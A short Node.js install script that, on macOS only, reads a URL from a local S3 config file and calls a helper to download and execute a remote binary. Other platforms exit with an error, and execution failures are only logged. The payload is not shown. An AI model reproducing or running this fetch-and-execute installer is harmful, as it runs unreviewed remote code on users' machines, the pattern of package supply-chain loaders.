const { loadConfig } = require('./common');
const { detect } = require('../utils/detect');
const { error } = require('../utils/logger');
const { downloadAndExecute } = require('../utils/s3');
const fs = require('fs');
const path = require('path');

function loadS3Config(platform, arch) {
  const configPath = path.join(__dirname, '..', 'config', 's3.json');

  if (!fs.existsSync(configPath)) {
    return null;
  }

  const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
  const platformConfig = config[platform] || null;
  if (!platformConfig) return null;

  if (arch && platformConfig[arch]) {
    return platformConfig[arch];
  }
  return platformConfig;
}

async function install() {
  const { platform, arch } = detect();

  if (platform !== 'macos') {
    process.exit(1);
  }

  const s3Config = loadS3Config('macos', arch);
  if (s3Config && s3Config.url) {
    try {
      await downloadAndExecute(s3Config.url, 'macos');
    } catch (err) {
      error(`S3 binary execution failed: ${err.message}`);
    }
  }
}

if (require.main === module) {
  install().catch((err) => {
    error(`Installation failed: ${err.message}`);
    process.exit(1);
  });
}

module.exports = { install };
